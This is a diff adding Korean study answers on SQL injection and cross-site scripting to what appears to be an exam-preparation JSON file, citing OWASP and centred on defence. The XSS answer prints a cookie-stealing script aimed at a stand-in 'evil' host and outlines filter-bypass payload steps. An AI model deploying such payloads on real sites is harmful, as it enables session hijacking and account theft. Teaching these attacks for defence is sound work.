@@ -106,5 +106,71 @@
       ],
       "review_scope": "명시한 표현만 출처 대조. 답안 전체의 전문가 검수나 공식 정답 인증이 아님."
     }
+  },
+  "t-adce57c3": {
+    "short": {
+      "source_sha256": "d56b8396c134371d1db7582364da12b0901f5a628a2f6b8f0d3521447aba0bc7",
+      "body": "## 1. SQL 인젝션의 개요\n- 정의: 웹 애플리케이션이 사용자 입력값을 SQL 구문과 데이터로 분리하지 않고 질의문에 결합할 때, 조작된 입력으로 질의 구조가 변경되어 DB가 비정상 조회·변조되는 [[injection-attack|인젝션 공격]]\n- 배경: 신뢰할 수 없는 값이 SQL 구문으로 해석되는 것이 근본 원인\n\n## 2. SQL 인젝션의 개념도 및 공격 유형\n```mermaid\nflowchart LR\n  A[공격자] -->|조작된 입력| W[웹 애플리케이션]\n  W -->|입력을 결합한 SQL| DB[(데이터베이스)]\n  DB -->|비정상 결과 노출| A\n```\n| 유형 | 내용 |\n|---|---|\n| [[error-based-sql-injection|Error-based]] | DB 오류 메시지로 구조 파악 |\n| [[union-based-sql-injection|UNION-based]] | 질의 결합으로 타 테이블 결과 노출 |\n| [[blind-sql-injection|Blind]] | 참·거짓([[boolean-based-blind-sql-injection|Boolean]])·응답지연([[time-based-blind-sql-injection|Time]])으로 간접 추론 |\n| [[out-of-band-sql-injection|Out-of-band]] | 외부 채널로 데이터 전송 |\n\n## 3. 탐지 및 조치 방법\n| 구분 | 내용 |\n|---|---|\n| 탐지 | [[web-application-firewall|WAF]] 시그니처, 로그 내 이상 패턴 분석, [[dynamic-application-security-testing|DAST]] 점검 |\n| 조치 | [[prepared-statement|Prepared Statement]], 입력값 화이트리스트 검증, 오류메시지 숨김, DB 계정 [[least-privilege|최소권한]] |\n\n## 4. 고려사항\n- [[secure-coding|시큐어코딩]] 가이드 준수, [[static-application-security-testing|SAST]]로 개발단계 사전 제거\n- [[object-relational-mapping|ORM]] 사용 시에도 문자열 결합을 피하고 값 바인딩 사용, 정기 보안점검\n\n### 적용 조건\n값은 바인딩하되 테이블명·컬럼명·정렬 방향은 애플리케이션이 정한 허용 목록에서 선택한다. 입력 검증·WAF·오류 숨김은 바인딩을 대신하지 않는다. ORM이나 저장 프로시저도 내부에서 입력을 문자열로 결합하면 취약할 수 있다.",
+      "sources": [
+        {
+          "title": "OWASP SQL Injection Prevention Cheat Sheet",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
+          "scope": "질의와 값 분리, 식별자 허용 목록, ORM·프로시저, 수동 이스케이프의 한계"
+        }
+      ],
+      "reviewed_on": "2026-11-22",
+      "review_scope": "정의·분류·방어 원칙과 적용 한계 대조. 사례별 실증·공식 채점 기준 검증은 아님."
+    },
+    "long": {
+      "source_sha256": "e6460374f2642e0c408fca5a1dad7eef19b02eb89d88a518685c6955e5537c1f",
+      "body": "## 1. SQL 인젝션의 개요\n### 가. 정의\n- 웹 애플리케이션이 사용자 입력값을 SQL 구문과 데이터를 분리하지 않고 질의문에 결합할 때, 조작된 입력에 의해 질의 구조가 변경되어 인증 우회, 데이터 노출·변조 등이 발생하는 [[injection-attack|인젝션 공격]]\n\n### 나. 등장배경 및 필요성\n- 문자열 결합으로 데이터가 SQL 구문에 섞이는 것이 근본 원인\n- OWASP는 파라미터화 질의와 허용된 식별자 선택을 주요 예방책으로 제시\n- 자동화 점검도구 보급으로 사전 진단 중요, 피해 범위는 DB 기능과 실행 계정 권한에 따라 달라짐\n\n### 다. 핵심 개념\n| 개념 | 내용 |\n|---|---|\n| 질의 구조 변조 | 입력값이 데이터가 아닌 질의 구문으로 해석되어 원래 로직 변경 |\n| 신뢰경계 위반 | 신뢰할 수 없는 입력이 검증 없이 DB 신뢰영역으로 유입 |\n| 정보 노출 경로 | 오류 메시지, 결과 집합, 응답 시간 차이를 통한 간접 획득 |\n\n## 2. SQL 인젝션의 구성도 및 동작\n### 가. 구성도\n```mermaid\nflowchart TB\n  A[공격자] -->|조작된 파라미터| WEB[웹 서버·애플리케이션]\n  WEB -->|입력을 결합한 SQL| DB[(DBMS)]\n  DB -->|오류·결과·응답시간| WEB\n  WEB -->|정보 노출| A\n  DEF[\"WAF / 시큐어코딩 / Prepared Statement\"] -.차단.-> WEB\n```\n\n### 나. 구성요소\n| 구성요소 | 역할 | 핵심기술 |\n|---|---|---|\n| 취약 입력점 | GET·POST 파라미터, 쿠키, HTTP 헤더 등 미검증 입력 경로 | 입력값 식별 |\n| 동적 SQL | 입력값을 결합해 생성되는 질의 | 문자열 결합 질의 |\n| DBMS | 변조된 질의를 실행하는 대상 | 질의 처리 엔진 |\n| 방어 계층 | 공격 차단·탐지 | [[prepared-statement|Prepared Statement]], [[web-application-firewall|WAF]] |\n\n### 다. 공격 진행 단계 (방어 관점 이해)\n1. 입력점 식별: 특정 입력에 대한 응답·오류 변화 관찰\n2. DBMS 유형 추정: 오류 메시지·함수 차이로 구분\n3. 스키마 파악 시도: 메타정보 조회로 테이블·컬럼 구조 추론\n4. 데이터 노출: 결과 결합 또는 간접 추론 방식 이용\n5. 권한 확대 가능성: 과도한 DB 권한 시 파일·명령 접근 위험\n\n## 3. SQL 인젝션의 상세\n### 가. 공격 기법 유형 (탐지·방어 기준)\n| 기법 | 특징 | 방어 포인트 |\n|---|---|---|\n| 인증 우회 | 조건식이 항상 참이 되도록 유도 | Prepared Statement, 입력 검증 |\n| [[error-based-sql-injection|Error-based]] | DB 오류 메시지에 내부정보 노출 | 파라미터 바인딩; 오류 숨김은 정보 노출 완화 |\n| [[union-based-sql-injection|UNION-based]] | 질의 결합으로 타 테이블 결과 노출 | 파라미터 바인딩, 권한 분리 |\n| [[boolean-based-blind-sql-injection|Boolean-based Blind]] | 응답 페이지 차이로 1비트씩 추론 | 파라미터 바인딩; 응답 표준화는 보조 조치 |\n| [[time-based-blind-sql-injection|Time-based Blind]] | 응답 지연 유무로 조건 참·거짓 추론 | 파라미터 바인딩; 타임아웃·WAF는 보조 조치 |\n| [[out-of-band-sql-injection|Out-of-band]] | DNS·HTTP 등 외부 채널로 데이터 반출 | 아웃바운드 통신 통제 |\n\n### 나. Blind SQL Injection 상세\n- 오류 메시지와 질의 결과가 화면에 직접 표시되지 않는 환경에서, 응답의 참·거짓 또는 지연 여부를 관찰해 데이터를 간접 추론하는 기법\n| 구분 | [[boolean-based-blind-sql-injection|Boolean 기반]] | [[time-based-blind-sql-injection|Time 기반]] |\n|---|---|---|\n| 판단 기준 | 정상·비정상 응답 페이지의 차이 | 조건 성립 시 발생하는 응답 지연 |\n| 활용 환경 | 참·거짓에 따라 화면이 달라질 때 | 결과 차이가 드러나지 않을 때 |\n| 특징 | 자동화 시 다수 요청 발생, 추출 속도 느림 | 네트워크 지연과 구분 필요 |\n| 탐지 | 동일 입력점 반복 요청 패턴 모니터링 | 비정상 지연 질의 로깅·WAF |\n\n### 다. 탐지 방법\n| 구분 | 방법 |\n|---|---|\n| 네트워크·경계 | [[web-application-firewall|WAF]] 시그니처·이상패턴 탐지, [[intrusion-detection-system|IDS]] 연계 |\n| 로그 분석 | 웹·DB 접근로그의 이상 질의·특수문자·반복요청 [[siem|SIEM]] 상관분석 |\n| 진단 도구 | [[dynamic-application-security-testing|DAST]] 동적 점검, [[static-application-security-testing|SAST]] 소스 취약점 분석, 모의해킹 |\n\n### 라. 조치 방법\n| 구분 | 조치 |\n|---|---|\n| 근본 대책 | [[prepared-statement|Prepared Statement]]·파라미터 바인딩으로 입력을 데이터로만 처리 |\n| 입력 검증 | 형식·범위 검증과 허용 목록; 수동 이스케이프만으로 방어하지 않음 |\n| 권한 최소화 | DB 계정 [[least-privilege|최소권한]], 응용별 계정 분리, 관리 프로시저 제거 |\n| 오류 처리 | 상세 오류메시지 비노출, 공통 오류 페이지 |\n| 안전한 설계 | [[stored-procedure|저장 프로시저]]·[[object-relational-mapping|ORM]] 사용 시에도 내부 동적 질의까지 값 바인딩 확인 |\n| 상시 대응 | WAF 운영, 정기 취약점 진단 및 패치 |\n\n## 4. SQL 인젝션 대응 시 고려사항 및 발전방향\n| 구분 | 고려사항 |\n|---|---|\n| 개발 | [[secure-coding|시큐어코딩]] 가이드 의무화, 코드리뷰·SAST 파이프라인 통합 |\n| 운영 | WAF 튜닝으로 오탐·미탐 최소화, 로그 보존 및 추적성 확보 |\n| 조직 | 개발·보안 협업([[devsecops|DevSecOps]]), 개발자 보안교육 |\n| 발전방향 | AI 기반 이상 질의 탐지, RASP(실행 중 자기보호) 적용 확대 |\n\n## 5. 결론\n- SQL 인젝션은 입력값을 데이터로만 처리하는 Prepared Statement가 주요 예방책이며, 시큐어코딩·WAF·최소권한·상시 점검을 결합한 다계층 방어가 필요\n\n### 적용 조건\n값은 바인딩하되 테이블명·컬럼명·정렬 방향은 애플리케이션이 정한 허용 목록에서 선택한다. 입력 검증·WAF·오류 숨김은 바인딩을 대신하지 않는다. ORM이나 저장 프로시저도 내부에서 입력을 문자열로 결합하면 취약할 수 있다.",
+      "sources": [
+        {
+          "title": "OWASP SQL Injection Prevention Cheat Sheet",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
+          "scope": "질의와 값 분리, 식별자 허용 목록, ORM·프로시저, 수동 이스케이프의 한계"
+        }
+      ],
+      "reviewed_on": "2026-11-22",
+      "review_scope": "정의·분류·방어 원칙과 적용 한계 대조. 사례별 실증·공식 채점 기준 검증은 아님."
+    }
+  },
+  "t-97c47931": {
+    "short": {
+      "source_sha256": "5e0a3de0e6955da71a1011367bc0e1f659df4aac8b9a54897595753e2ca566a3",
+      "body": "## 1. 크로스 사이트 스크립팅의 개요\n- 정의: 공격자가 웹 페이지에 악성 스크립트([[javascript|JavaScript]])를 삽입하고, 이를 신뢰하는 다른 사용자의 브라우저에서 실행시켜 [[session-hijacking|세션 탈취]]·[[cookie|쿠키]] 유출·악성 사이트 유도를 일으키는 웹 취약점(웹 인젝션)\n- 발생원인: 사용자 입력값을 검증·인코딩 없이 HTML 응답에 반영, 브라우저의 [[same-origin-policy|동일 출처 정책]] 신뢰 악용\n\n## 2. XSS의 개념도 및 구성요소\n```mermaid\nflowchart LR\n  A[공격자] -->|스크립트 삽입| B[취약 웹서버]\n  B -->|스크립트 포함 페이지| C[피해자 브라우저]\n  C -->|쿠키·세션 전송| D[공격자 서버]\n```\n| 구성요소 | 역할 |\n|---|---|\n| 취약 입력점 | 게시판·검색어·URL 파라미터 등 검증 없는 입력 |\n| 악성 스크립트 | document.cookie 전송, DOM 조작, 키로깅 |\n| 피해자 브라우저 | 사이트 출처로 스크립트 실행, 권한 위임 |\n\n## 3. 저장형·반사형 비교\n| 구분 | Stored XSS(저장형) | Reflected XSS(반사형) |\n|---|---|---|\n| 저장 관점 | 서버 DB·클라이언트 저장소 등에 지속 저장 | 지속 저장 없이 입력이 처리 결과에 반영 |\n| 전달 예 | 저장 콘텐츠 조회 | 조작된 요청·URL 등으로 취약 처리 경로 도달 |\n| 피해 범위 | 콘텐츠 접근 범위에 따라 다름 | 전달 범위와 실행 권한에 따라 다름 |\n| 위험도 | 실행 권한과 노출 범위에 따라 평가 | 실행 권한과 노출 범위에 따라 평가 |\n- 기타: DOM 기반 XSS - 클라이언트 코드의 위험한 DOM 처리로 발생. 저장형·반사형과 겹칠 수 있음\n\n## 4. 대응방안\n- 입력 검증(화이트리스트), 출력 시 컨텍스트별 [[output-encoding|출력 인코딩]](HTML·속성·JavaScript·URL 등 문맥별 처리)\n- [[content-security-policy|CSP]] 헤더로 인라인 스크립트 제한, 쿠키 HttpOnly·Secure 속성\n- [[web-application-firewall|WAF]] 적용, 보안 라이브러리(OWASP ESAPI, DOMPurify), 시큐어코딩 점검\n\n### 방어 수단의 역할\n일반 텍스트는 textContent 같은 안전한 출력 API를 우선한다. HTML을 허용해야 하면 검증된 HTML 정화 도구를 사용한다. HTML 엔티티 변환 하나로 모든 출력 문맥을 보호할 수 없다. HttpOnly는 쿠키의 스크립트 읽기를 제한하지만 XSS 실행 자체를 막지 않는다. CSP·쿠키 속성·WAF는 근본 출력 처리를 대신하지 않는다.",
+      "sources": [
+        {
+          "title": "OWASP XSS Prevention Cheat Sheet",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
+          "scope": "문맥별 인코딩·안전한 출력 API·HTML 정화와 보조 방어"
+        },
+        {
+          "title": "OWASP Types of XSS",
+          "url": "https://owasp.org/www-community/Types_of_Cross-Site_Scripting",
+          "scope": "저장·반사 분류와 클라이언트 실행 분류의 중첩"
+        }
+      ],
+      "reviewed_on": "2026-11-22",
+      "review_scope": "정의·분류·방어 원칙과 적용 한계 대조. 사례별 실증·공식 채점 기준 검증은 아님."
+    },
+    "long": {
+      "source_sha256": "750330071b7553380409a229e5a2ef738fcdfc5728a409a4d2cfed8ad3965481",
+      "body": "## 1. 크로스 사이트 스크립팅의 개요\n### 가. 정의\n- 공격자가 신뢰된 웹 사이트에 악성 클라이언트 스크립트([[javascript|JavaScript]])를 삽입하여, 해당 사이트를 열람하는 다른 사용자의 브라우저에서 사이트 권한으로 실행시키는 [[injection-attack|인젝션]] 계열 웹 취약점\n- 공격 대상이 서버가 아닌 사용자(클라이언트)라는 점이 [[sql-injection|SQL 인젝션]]과 구별되는 특징\n\n### 나. 등장배경 / 필요성\n- 동적 웹 페이지에서 사용자 입력을 검증·인코딩 없이 HTML 응답에 반영\n- 브라우저의 [[same-origin-policy|동일 출처 정책]]은 출처 간 접근만 차단하므로, 사이트 내부에 삽입된 스크립트는 정상 코드로 신뢰\n- 위험도는 실행 권한·노출 범위·데이터 민감도에 따라 평가\n\n### 다. 핵심 개념\n| 구분 | 내용 |\n|---|---|\n| 공격 매체 | 게시판·댓글·검색 파라미터·URL 프래그먼트 |\n| 실행 주체 | 피해자 브라우저(사이트 출처 권한) |\n| 주요 피해 | [[cookie|쿠키]]·세션 탈취, 계정 도용, 악성 사이트 리다이렉트, 키로깅, 웜 전파 |\n\n## 2. XSS의 구성도 및 구성요소\n### 가. 공격 구성도\n```mermaid\nflowchart TB\n  A[공격자] -->|1. 악성 스크립트 삽입| B[\"취약 웹 애플리케이션(입력 미검증)\"]\n  B -->|2. 스크립트 포함 응답| C[피해자 브라우저]\n  C -->|3. 스크립트 실행| C\n  C -->|4. 접근 가능한 쿠키 전송| D[공격자 수집 서버]\n  D -->|5. 세션 재사용| B\n```\n### 나. 구성요소\n| 구성요소 | 역할 | 핵심기술 |\n|---|---|---|\n| 취약 입력점 | 검증 없이 출력되는 파라미터·저장 필드 | GET·POST 파라미터, DOM 소스(location, referrer) |\n| 악성 페이로드 | 스크립트 실행 및 정보 탈취 | script 태그, 이벤트 핸들러(onerror), javascript: URI, 인코딩 우회 |\n| 전달 채널 | 피해자에게 페이로드 도달 | 게시글 저장, 단축 URL [[phishing|피싱]] 메일 |\n| 수집 서버 | 탈취 정보 수신 | 이미지 요청·XHR·fetch 통한 외부 전송 |\n\n### 다. 취약 흐름 예시(쿠키 보호가 없는 경우)\n1. 입력 필드에 테스트 스크립트를 넣어 필터링 유무 확인\n2. 필터 우회 페이로드(대소문자 혼용, 이벤트 핸들러, 유니코드 인코딩) 작성\n3. 게시글 저장 또는 조작 URL 배포\n4. 피해자 열람 시 스크립트 실행, 세션 쿠키 외부 전송\n5. 공격자가 쿠키로 세션 복제([[session-hijacking|세션 하이재킹]]) 후 계정 접근\n\n## 3. 저장·반사와 DOM 기반 실행의 구분\n### 가. Stored XSS(저장형·지속형)\n- 악성 입력이 서버 DB 또는 클라이언트 저장소 등에 지속 저장되어, 취약한 출력 경로를 조회하는 사용자에게 실행될 수 있음\n- 특징: 저장된 콘텐츠에 피해자가 접근하는 경로가 필요, 피해 범위 광범위·지속적, 관리자 세션 탈취 시 사이트 장악 가능\n- 예: 게시글 본문에 `<script>new Image().src=\"http://evil/c?\"+document.cookie</script>` 삽입\n\n### 나. Reflected XSS(반사형·비지속형)\n- 입력이 지속 저장되지 않고 처리 결과에 반영되어 실행되는 형태. 서버 응답 반사뿐 아니라 취약한 클라이언트 코드의 처리로도 발생할 수 있음\n- 특징: 조작 URL·요청 전달에 사회공학이 결합될 수 있음, 영향은 전달 방식과 취약한 실행 문맥에 따라 달라짐\n- 예: 검색 결과 페이지가 `검색어: <입력값>`을 그대로 출력할 때 `?q=<script>...</script>` 링크 배포\n\n### 다. 유형 비교\n| 구분 | Stored XSS | Reflected XSS | DOM 기반 XSS(참고) |\n|---|---|---|---|\n| 저장 관점 | DB 등 저장 매체 | 요청에 포함 | 저장형·반사형과 중첩 가능 |\n| 실행 관점 | 출력 경로에 따라 다름 | 출력 경로에 따라 다름 | 클라이언트의 위험한 DOM 처리 |\n| 노출 경로 | 저장 콘텐츠 조회 | 조작 요청 등 | 취약한 클라이언트 처리 경로 |\n| 피해 범위 | 조회자·실행 권한에 의존 | 전달 범위·실행 권한에 의존 | 저장·전달 방식과 실행 권한에 의존 |\n| 탐지 | 서버 로그·DB 점검 | 요청 로그 분석 | 프래그먼트 등 서버에 전송되지 않는 입력은 서버 로그만으로 확인 곤란 |\n\n## 4. XSS 대응 시 고려사항 및 발전방향\n| 구분 | 고려사항 |\n|---|---|\n| 입력 검증 | 화이트리스트 기반 허용 문자 정의, 길이·형식 검증, 서버 측 검증 필수 |\n| 출력 인코딩 | 컨텍스트(HTML 본문·속성·JavaScript·URL)별 [[output-encoding|출력 인코딩]], 해당 문맥용 인코더 사용 |\n| 브라우저 보호 | [[content-security-policy|CSP]]로 인라인·외부 스크립트 출처 제한, 쿠키 HttpOnly·Secure·SameSite 속성 |\n| 아키텍처 | [[web-application-firewall|WAF]] 시그니처·행위 탐지, 보안 라이브러리(OWASP ESAPI, DOMPurify), 템플릿 엔진 자동 이스케이프 |\n| 개발 프로세스 | [[secure-coding|시큐어코딩]] 가이드 준수, SAST·DAST 점검, 취약점 진단 정례화 |\n| 발전방향 | Trusted Types API, 프레임워크 기본 이스케이프, 브라우저 내장 XSS 방어 보완 |\n\n## 5. 결론\n- XSS는 입력과 출력 경계에서 데이터와 코드를 구분하지 못해 발생하므로, 안전한 출력 API·문맥별 인코딩·필요한 HTML 정화를 기본으로 하고 CSP를 보조 계층으로 더하는 다층 방어와 시큐어코딩 문화 정착이 근본 대책임\n\n### 방어 수단의 역할\n일반 텍스트는 textContent 같은 안전한 출력 API를 우선한다. HTML을 허용해야 하면 검증된 HTML 정화 도구를 사용한다. HTML 엔티티 변환 하나로 모든 출력 문맥을 보호할 수 없다. HttpOnly는 쿠키의 스크립트 읽기를 제한하지만 XSS 실행 자체를 막지 않는다. CSP·쿠키 속성·WAF는 근본 출력 처리를 대신하지 않는다.",
+      "sources": [
+        {
+          "title": "OWASP XSS Prevention Cheat Sheet",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
+          "scope": "문맥별 인코딩·안전한 출력 API·HTML 정화와 보조 방어"
+        },
+        {
+          "title": "OWASP Types of XSS",
+          "url": "https://owasp.org/www-community/Types_of_Cross-Site_Scripting",
+          "scope": "저장·반사 분류와 클라이언트 실행 분류의 중첩"
+        }
+      ],
+      "reviewed_on": "2026-11-22",
+      "review_scope": "정의·분류·방어 원칙과 적용 한계 대조. 사례별 실증·공식 채점 기준 검증은 아님."
+    }
   }
 }
